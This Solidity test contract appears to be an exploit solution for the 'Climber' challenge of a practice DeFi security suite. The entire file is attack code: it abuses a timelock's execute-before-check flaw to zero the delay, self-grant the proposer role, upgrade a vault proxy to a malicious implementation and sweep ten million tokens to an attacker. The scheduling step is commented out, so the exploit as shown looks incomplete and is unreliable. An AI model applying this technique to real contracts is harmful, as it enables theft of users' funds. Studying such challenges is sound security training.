// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVaultUpgradableSweeper} from "../../../src/Contracts/climber/ClimberVaultUpgradableSweeper.sol";
import "forge-std/Test.sol";

contract ClimberVaultAttack is Test {
    address public attacker;
    address public climberTimelock;
    address public climberVaultProxy;
    address public dvt;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(address _attacker, address _climberTimelock, address _climberVaultProxy, address _dvt) {
        attacker = _attacker;
        climberTimelock = _climberTimelock;
        climberVaultProxy = _climberVaultProxy;
        dvt = _dvt;
    }

    function attack() public payable {
        // Deploy new ClimberVaultUpgradableSweeper implementation
        ClimberVaultUpgradableSweeper newClimberImplementation = new ClimberVaultUpgradableSweeper();

        console.logBytes32(PROPOSER_ROLE);

        // Create multiple transactions to execute
        uint256 transactionCount = 4;
        address[] memory targets = new address[](transactionCount);
        uint256[] memory values = new uint256[](transactionCount);
        bytes[] memory dataElements = new bytes[](transactionCount);

        // A. First transaction is to update delay to 0
        targets[0] = climberTimelock;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // B. Second transaction is to set the timelock role to proposer
        targets[1] = climberTimelock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, climberTimelock);

        // C. Third transaction is to upgrade the implementation of the proxy to the new implementation
        targets[2] = climberVaultProxy;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)", address(newClimberImplementation));

        // D. Fourth transaction is to set the sweeper to attacker
        targets[3] = climberVaultProxy;
        values[3] = 0;
        dataElements[3] =
            abi.encodeWithSignature("sendTokensToAddress(address,address,uint256)", dvt, attacker, 10_000_000e18);

        // E. Schedule this transaction in the timelock
        bytes32 salt = 0x0;
        // targets[4] = climberTimelock;
        // values[4] = 0;
        // dataElements[4] = abi.encodeWithSignature(
        //     "schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt
        // );

        // Execute transactions
        ClimberTimelock(payable(climberTimelock)).execute({
            targets: targets,
            values: values,
            dataElements: dataElements,
            salt: salt
        });
    }
}
